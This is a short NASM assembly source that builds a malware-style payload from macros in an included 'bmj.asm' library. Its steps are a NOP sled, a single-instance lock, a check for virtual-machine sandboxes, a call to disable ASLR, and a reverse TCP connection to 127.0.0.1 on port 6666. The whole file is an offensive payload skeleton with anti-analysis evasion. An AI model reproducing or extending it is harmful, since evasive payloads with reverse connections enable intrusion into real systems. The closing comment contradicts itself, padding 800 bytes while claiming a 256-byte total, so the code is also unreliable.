    BITS 64
    %include "bmj.asm"
    section .text
    global _start
    _start:
        nops 40
        flock                          ; Enforce only a single process instance of the payload running concurrently
        vm_age                         ; Check if the sample was launched inside VM by inspecting /etc/hostname STATX structure
        disable_aslr                   ; Disable ASLR for further use
        sock_connect "127.0.0.1", 6666 ; Address for reverse TCP pingpack
        padd_byte 800, 0x90            ; Padds the payload size with '0x90' to reach exactly 256 bytes in total after being composed by Nasm
